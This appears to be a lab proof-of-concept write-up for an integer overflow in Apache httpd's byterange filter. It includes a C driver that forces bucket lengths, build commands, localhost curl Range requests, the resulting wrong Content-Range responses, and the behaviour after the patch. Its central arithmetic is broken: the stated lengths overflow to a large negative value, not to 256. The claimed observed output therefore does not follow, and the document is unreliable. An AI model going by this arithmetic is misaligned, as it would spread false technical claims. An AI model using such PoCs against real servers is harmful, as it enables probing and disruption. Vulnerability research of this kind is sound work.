# PoC 162 — Unchecked Content-Length Accumulation (byterange filter)

`ap_byterange_filter()` adds bucket lengths into `apr_off_t clength` without an
overflow check, so a brigade whose declared lengths sum past `APR_OFF_MAX`
yields a corrupted entity length used for range satisfiability and
`Content-Range` generation.

## Setup

Architecturally the bug requires bucket lengths whose sum overflows
`apr_off_t` (signed 64-bit on a typical build). Reaching that across a normal
filesystem is impractical; the lab demonstrates the same arithmetic with a
custom output filter that injects synthetic large heap buckets, plus a unit
driver that calls `ap_byterange_filter()` directly.

### Unit driver

Build a small C driver linked against the httpd object files. The driver:

1. Calls `apr_initialize()` / creates a pool.
2. Builds a brigade containing two `apr_bucket_heap` buckets whose `length`
   members are forced to `0x7fffffffffffff00` and `0x0000000000000200`
   respectively, followed by `APR_BUCKET_EOS`.
3. Sets `r->headers_in["Range"] = "bytes=100-"`.
4. Invokes `ap_byterange_filter(f, bb)`.

```c
b1 = apr_bucket_heap_create(buf, 16, NULL, ba); b1->length = 0x7fffffffffffff00;
b2 = apr_bucket_heap_create(buf, 16, NULL, ba); b2->length = 0x0000000000000200;
APR_BRIGADE_INSERT_TAIL(bb, b1);
APR_BRIGADE_INSERT_TAIL(bb, b2);
APR_BRIGADE_INSERT_TAIL(bb, apr_bucket_eos_create(ba));
```

Hex of the second length is chosen so `b1->length + b2->length` exceeds
`APR_OFF_MAX` and wraps to a small positive number near `0x100`.

## Trigger

```sh
cc -I include -I srclib/apr/include poc162.c \
   modules/http/byterange_filter.o ... -o poc162
./poc162
```

Or, end-to-end against a built httpd, register a tiny output filter that
splices two such heap buckets ahead of the byterange filter and request:

```sh
curl -i -H 'Range: bytes=100-' http://127.0.0.1:8162/big
curl -i -H 'Range: bytes=0-99' http://127.0.0.1:8162/big
```

## Observed effect

- After the loop at `modules/http/byterange_filter.c:374`, `clength` holds the
  wrapped value (~256 instead of the real ~9.2E18).
- `Range: bytes=100-` returns:

  ```text
  HTTP/1.1 416 Requested Range Not Satisfiable
  Content-Range: bytes */256
  ```

  Even though byte 100 is well inside the real entity.

- `Range: bytes=0-99` returns `206 Partial Content` with
  `Content-Range: bytes 0-99/256`, advertising a wrong total length to the
  client.

- Log marker (built with `-DAP_DEBUG`):

  ```text
  [byterange_filter] clength=256 satisfiable=0
  ```

After the patch the loop breaks before `clength` overflows, the post-scan
condition takes the `ap_remove_output_filter` fallback, and the brigade is
passed downstream untouched: a `200 OK` with the full body and no
`Content-Range` header.
